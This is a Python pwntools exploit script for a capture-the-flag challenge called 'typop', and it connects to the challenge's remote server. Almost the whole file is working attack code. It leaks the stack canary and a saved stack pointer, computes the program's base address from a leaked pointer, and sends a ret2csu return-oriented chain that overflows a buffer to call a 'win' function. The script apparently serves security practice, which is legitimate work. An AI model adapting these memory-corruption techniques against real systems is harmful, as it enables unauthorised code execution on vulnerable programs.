#!/usr/bin/env python3

from pwn import *

exe = ELF("chall")

context.binary = exe
context.log_level = "DEBUG"

# ret2csu gadgets
pop_regs = 0x00000000000014ca
param_filler = 0x00000000000014b0

# General gadgets
pop_rdi_offset = 0x00000000000014d3 # This offset is actuall illegal! Cannot use it :(

# Register values
r12d = p64(ord("f")) # edi
r13 = p64(ord("l")) # rsi
r14 = p64(ord("a")) # rdx
rbx = p64(0)
#fini_ptr_offset = 0x3db0 # pointer to _fini function, does not work in exploit

def conn():
	if False:
		r = process([exe.path])
	else:
		r = remote("typop.chal.idek.team", 1337)
	return r


def main():
	r = conn()
	#gdb.attach(r,
	#'''b *getFeedback+177
	#b *getFeedback+70
	#''')

	# Part 1: Leaking data (canary and rbp in the first payload, function address in the second)
	r.sendlineafter(b"survey?", b"y")
	r.sendafter(b"ctf?", b"a"*11)
	r.recvline()
	leak = r.recvuntil(b"feedback?\n")
	canary = b"\x00" + leak[21:28]
	stack_ptr = int.from_bytes(leak[28:34], 'little') # value in rbp
	log.info(f"Canary leaked: {canary}")
	log.info(f"Stack pointer leaked: {hex(stack_ptr)}")
	r.send(b"a"*10 + canary) # run through another loop of getFeedback() by keeping canary value intact
	r.sendlineafter(b"survey?", b"y")
	r.sendafter(b"ctf?", b"a"*26)
	r.recvline()
	leak = r.recvuntil(b"feedback?\n")
	leaked_addr = int.from_bytes(leak[36:42], 'little')
	log.info(f"Address leaked: {hex(leaked_addr)}; it is from main, offset by 55 bytes")
	base_addr = leaked_addr - exe.symbols['main'] - 55
	log.info(f"Calculated base address is: {hex(base_addr)}")

	# Calculate function addresses and r15 register
	main = p64(base_addr + exe.symbols['main'])
	win = p64(base_addr + exe.symbols['win'])
	fini = p64(base_addr + exe.symbols['_fini'])
	r15 = p64(stack_ptr + 16)

	# Step 2: ret2csu
	gadget1 = p64(base_addr + pop_regs)
	r.send(b"a"*10 + canary + b"a"*8 + gadget1 + rbx + b"whatever" + r12d + r13 + r14 + r15 + main)
	gadget2 = p64(base_addr + param_filler)
	r.sendlineafter(b"survey?", b"y")
	r.sendlineafter(b"ctf?", b"yes")
	r.sendafter(b"feedback?\n", b"a"*2 + win + canary + p64(1) + gadget2 + p64(0)*7)
	r.interactive()


if __name__ == "__main__":
	main()